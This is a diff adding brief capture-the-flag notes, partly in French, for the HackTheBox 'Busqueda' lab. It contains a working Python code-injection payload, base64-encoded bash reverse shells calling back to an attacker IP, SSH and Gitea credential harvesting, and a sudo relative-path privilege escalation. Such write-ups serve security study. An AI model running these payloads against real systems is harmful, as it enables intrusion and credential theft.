@@ -1,0 +1,43 @@
+IP in borwser, modify /etc/hosts
+send POST query
+Capture request in BURP, Copy to a file search.req :
+
+POST /search HTTP/1.1
+Host: searcher.htb
+[...]
+Priority: u=0, i
+
+engine=Atlassian&query=Monkey<---- Add 'FUZZ'
+$ffuf -request search.req -request-proto http -w /opt/SecLists/Fuzzing/special-chars.txt  ==  one response with 0
+
+https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
+dans la requete, tester le payload polyglot : ${{<%[%'"}}%\.    et supprimer 1 a 1 pour voir où ca bug'
+
+Ok avec : engine=Atlassian&query=Monkey')%2b__import__('os').system('ls')%20%23
+Reverse shell : (NE MARCHE PAS SI CARACTERE + DEDANS, JOUER AVEC LES ESPACES)
+$echo -n "bash -i  >& /dev/tcp/10.10.14.195/4444 0>&1" | base64  -->  YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTk1LzQ0NDQgMD4mMQ==
+Puis : engine=Atlassian&query=Monkey')%2b__import__('os').system('echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTk1LzQ0NDQgMD4mMQ==|base64 -d|bash')%20%23  avec $nc -lnvp 4444
+
+--------------------------------------------> /home/user.txt
+$ss -lntp pour voir ce qui tourne sur la machine
+127.0.0.1:222 , 127.0.0.1:3000, 127.0.0.1:3306
+$cat /etc/apache2/sites-enabled -> ServerName gitea.searcher.htb 3000 / 
+
+Find ssh password into /var/www/data/.git/config -> connect with ssh then $sudo -l
+"User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *"  (DONC AVEC ARGUMENTS)
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py monkey ->
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+$sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+$sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea
+Récup password pour se connecter avec administrator à l'interface de Gitea, inspecter le script qu'on peut lancer en tant que root : system-checkup.py
+On voit que full-checkup n'a pas de chemin absolu 
+$vi full-checkup.sh 
+#!/bin/bash  bash -c ' bash -i &> /dev/tcp/IP/PORT 0>&1'       Esc :wq     chmod, lancer la commande sudo avec nc -lnvp PORT
+
+    
+
+
+
